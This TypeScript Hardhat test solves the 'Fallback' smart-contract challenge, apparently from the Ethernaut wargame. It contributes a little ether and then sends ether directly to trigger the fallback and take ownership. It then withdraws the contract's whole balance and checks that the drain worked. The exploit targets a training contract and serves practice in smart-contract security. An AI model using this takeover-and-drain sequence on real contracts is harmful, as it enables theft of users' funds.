import { expect } from "chai";
import { BigNumber, Contract, ContractFactory, providers, Signer } from "ethers";
import { ethers } from "hardhat";

describe("Fallback", function () {
  let signer: Signer;
  let myAddress: string;
  let challenge_instance_address = "0x58Da168B86E23A5eC55e6F816ac369cE026Bf5a8";
  let challengeFactory: ContractFactory;
  let challenge: Contract;

  before(async () => {
    [signer] = await ethers.getSigners();
    myAddress = await signer.getAddress();
    console.log("Primary Signer Address:", myAddress);
    challenge_instance_address = "0x58Da168B86E23A5eC55e6F816ac369cE026Bf5a8";
    challengeFactory = await ethers.getContractFactory("Fallback");
    challenge = challengeFactory.attach(challenge_instance_address);
  });

  it("Should solve the Fallback challenge", async () => {
    const contributeTx = await challenge.contribute({
      gasLimit: 50000,
      value: ethers.utils.parseEther('0.0001'),
    });
    await contributeTx.wait();

    const contribution = await challenge.getContribution() as BigNumber;
    const parsed_value = contribution.toNumber();
    
    expect(parsed_value).to.be.greaterThan(0, "The contribution to the Fallback contract seems to be 0 !!");

    const fallbackTx = await signer.sendTransaction({
      to: challenge.address,
      value: ethers.utils.parseEther("0.0000001"),
      gasLimit: 50000
    });

    await fallbackTx.wait();
    
    const owner = await challenge.owner();
    expect(owner).to.equal(myAddress, "Owner was not changed.");

    const withdrawTx = await challenge.withdraw();
    await withdrawTx.wait();
    
    const challengeBalance = await ethers.provider.getBalance(challenge.address);
    const parsed_balance = challengeBalance.toNumber();
    expect(parsed_balance).to.equal(0, "Challenge Balance was not set to 0. Challenge was thus not solved.");
  });
});
